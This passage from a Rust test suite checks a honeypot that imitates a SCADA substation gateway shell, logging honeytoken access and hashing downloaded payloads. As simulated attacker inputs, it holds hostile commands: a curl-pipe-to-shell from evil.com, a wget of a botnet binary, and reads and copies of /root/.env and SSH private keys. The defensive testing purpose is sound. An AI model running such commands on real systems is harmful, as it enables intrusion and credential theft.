        (String::from_utf8_lossy(&output).to_string(), events)
    }

    #[tokio::test]
    async fn test_session_interaction() {
        let (output, events) = run_test_session(&["uname -a", "whoami", "id"]).await;

        // Verify initial banner and prompt
        assert!(output.contains("Linux substation-gw01 5.15.0-88-generic"));
        assert!(output.contains("root@substation-gw01:~# "));

        // Verify command outputs
        assert!(output.contains("x86_64"));
        assert!(output.contains("root\r\n"));
        assert!(output.contains("uid=0(root) gid=0(root)"));

        // Verify command events emitted
        let cmd_events: Vec<&Event> = events.iter().filter(|e| e.event_type == "command").collect();
        assert!(cmd_events.iter().any(|e| e.data["command"] == "uname -a"));
        assert!(cmd_events.iter().any(|e| e.data["command"] == "whoami"));
        assert!(cmd_events.iter().any(|e| e.data["command"] == "id"));
    }

    #[tokio::test]
    async fn test_vfs_operations() {
        let (output, _) = run_test_session(&[
            "mkdir /tmp/test",
            "touch /tmp/test/payload.sh",
            "ls /tmp/test",
            "cat /tmp/test/payload.sh",
        ]).await;

        assert!(output.contains("payload.sh"));
    }

    #[tokio::test]
    async fn test_honeytoken_detection_root_env() {
        let (output, events) = run_test_session(&["cat /root/.env"]).await;

        // Attacker gets realistic fake secrets
        assert!(output.contains("API_KEY=hf_live_secret_994821a8f9"));
        assert!(output.contains("DATABASE_URL=postgres://scada_adm"));

        // High priority "token" event triggered with alert
        let token_ev = events.iter().find(|e| e.event_type == "token").expect("token event missing");
        assert_eq!(token_ev.data["token_file"], "/root/.env");
        assert_eq!(token_ev.data["command"], "cat /root/.env");
        assert_eq!(token_ev.data["severity"], "CRITICAL");
        assert_eq!(token_ev.data["message"], "Honeytoken accessed by attacker");

        // Also emits "honeytoken_hit"
        let hit_ev = events.iter().find(|e| e.event_type == "honeytoken_hit").expect("honeytoken_hit event missing");
        assert_eq!(hit_ev.data["token_file"], "/root/.env");
    }

    #[tokio::test]
    async fn test_honeytoken_relative_path_and_other_tokens() {
        let (_, events) = run_test_session(&[
            "cd /root",
            "cat .env",
            "head -n 2 /etc/scada/plc_auth.conf",
            "cp /root/.ssh/id_rsa /tmp/key",
        ]).await;

        let token_events: Vec<&Event> = events.iter().filter(|e| e.event_type == "token").collect();
        assert!(token_events.iter().any(|e| e.data["token_file"] == "/root/.env"));
        assert!(token_events.iter().any(|e| e.data["token_file"] == "/etc/scada/plc_auth.conf"));
        assert!(token_events.iter().any(|e| e.data["token_file"] == "/root/.ssh/id_rsa"));
    }

    #[tokio::test]
    async fn test_payload_sha256_file_write() {
        let payload_text = "echo 'malicious_reverse_shell_code' > /tmp/payload.sh";
        let (_, events) = run_test_session(&[payload_text, "cat /tmp/payload.sh"]).await;

        let expected_hash = compute_sha256(b"malicious_reverse_shell_code\n");

        let payload_ev = events.iter().find(|e| e.event_type == "payload").expect("payload event missing");
        assert_eq!(payload_ev.data["payload_sha256"], expected_hash);
        assert_eq!(payload_ev.data["payload_size"], b"malicious_reverse_shell_code\n".len());
        assert!(payload_ev.data["payload_sample"].as_str().unwrap().contains("malicious_reverse_shell_code"));
    }

    #[tokio::test]
    async fn test_payload_sha256_wget_download() {
        let (output, events) = run_test_session(&["wget http://192.168.1.50/botnet.elf", "ls -l botnet.elf"]).await;

        assert!(output.contains("saved"));
        assert!(output.contains("botnet.elf"));

        let payload_ev = events.iter().find(|e| {
            e.event_type == "payload" && e.data["command"].as_str().unwrap().contains("wget")
        }).expect("wget payload event missing");

        assert!(payload_ev.data["payload_sha256"].as_str().is_some());
        assert!(payload_ev.data["payload_size"].as_u64().unwrap() > 0);
    }

    #[tokio::test]
    async fn test_payload_sha256_curl_pipe_sh() {
        let (_, events) = run_test_session(&["curl http://evil.com/setup.sh | sh"]).await;

        let payload_ev = events.iter().find(|e| {
            e.event_type == "payload" && e.data["command"].as_str().unwrap().contains("curl")
        }).expect("curl payload event missing");

        assert!(payload_ev.data["payload_sha256"].as_str().is_some());
    }

    #[tokio::test]
    async fn test_payload_sha256_base64_decode() {
        let (_, events) = run_test_session(&["echo 'aGVsbG8gd29ybGQ=' | base64 -d > /tmp/decoded.txt", "cat /tmp/decoded.txt"]).await;

        let expected_hash = compute_sha256(b"hello world");
        let payload_ev = events.iter().find(|e| {
            e.event_type == "payload" && e.data["payload_sha256"] == expected_hash
        }).expect("base64 payload event missing");

        assert_eq!(payload_ev.data["payload_size"], 11);
    }

    #[tokio::test]
    async fn test_stealth_ps_no_leak() {
        let (output, _) = run_test_session(&["ps aux"]).await;

        // Anti-leak rule: NEVER leak internal details
        assert!(!output.to_lowercase().contains("honeyforge"), "ps aux leaked honeyforge!");
        assert!(!output.to_lowercase().contains("honeyforge-agent"), "ps aux leaked honeyforge-agent!");
        assert!(!output.to_lowercase().contains("rust"), "ps aux leaked rust threads!");

        // Realistic processes required by specification
        assert!(output.contains("systemd"));
        assert!(output.contains("kthreadd"));
        assert!(output.contains("sshd: root@pts/0"));
        assert!(output.contains("rsyslogd"));
        assert!(output.contains("cron"));
        assert!(output.contains("scada_agent"));
    }

    #[tokio::test]
    async fn test_stealth_netstat_and_env() {
        let (output, _) = run_test_session(&["netstat -tlpn", "env"]).await;

        assert!(!output.to_lowercase().contains("honeyforge"), "leaked honeyforge in netstat/env!");

        // netstat shows ports 22, 80, 2404, 502 with sshd, nginx, iec104_srv, modbus_gw
        assert!(output.contains(":22") && output.contains("sshd"));
        assert!(output.contains(":80") && output.contains("nginx"));
        assert!(output.contains(":2404") && output.contains("iec104_srv"));
        assert!(output.contains(":502") && output.contains("modbus_gw"));

        // env shows standard variables, no HF_*
        assert!(output.contains("USER=root"));
        assert!(output.contains("HOME=/root"));
        assert!(output.contains("SHELL=/bin/bash"));
        assert!(output.contains("TERM=xterm-256color"));
        assert!(!output.contains("HF_"));
    }

    #[tokio::test]
    async fn test_terminal_backspace_and_crlf() {
        let (sink, rx) = EventSink::test_sink();
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        let trap = HighInteractionTrap::new(&json!({})).unwrap();

        let server = tokio::spawn(async move {
            let (stream, _) = listener.accept().await.unwrap();
            let mut s = Session::new(stream, addr.port(), sink, "high_interaction", "substation-gw01".into(), 5.0);
            trap.handle(&mut s).await;
        });

        let mut client = TcpStream::connect(addr).await.unwrap();
        // Send "whx\x08oami\r\nexit\r\n"
        client.write_all(b"whx\x08oami\r\nexit\r\n").await.unwrap();

        let mut output = Vec::new();
        let _ = tokio::time::timeout(Duration::from_secs(3), client.read_to_end(&mut output)).await;
        let _ = server.await;

        let out_str = String::from_utf8_lossy(&output);
        assert!(out_str.contains("root\r\n"), "Backspace handling failed: {}", out_str);

        let mut events = Vec::new();
        while let Ok(ev) = rx.try_recv() {
            events.push(ev);
        }
        assert!(events.iter().any(|e| e.data["command"] == "whoami"));
    }

    #[tokio::test]
    async fn test_prompt_updates_with_cd() {
        let (output, _) = run_test_session(&["pwd", "cd /tmp", "pwd", "cd /root", "pwd"]).await;

        assert!(output.contains("root@substation-gw01:~# "));
        assert!(output.contains("root@substation-gw01:/tmp# "));
    }

    #[tokio::test]
    async fn test_vfs_file_mutation_and_cat() {
        let (output, _) = run_test_session(&[
            "echo 'line one' > /tmp/test.txt",
            "echo 'line two' >> /tmp/test.txt",
            "cat /tmp/test.txt",
        ]).await;

        assert!(output.contains("line one\r\nline two"));
    }

    #[tokio::test]
    async fn test_vfs_rm_rf() {
        let (output, _) = run_test_session(&[
            "mkdir -p /tmp/nest/dir",
            "touch /tmp/nest/dir/file.txt",
            "rm -rf /tmp/nest",
            "ls /tmp/nest",
        ]).await;

        assert!(output.contains("No such file or directory"));
    }
}
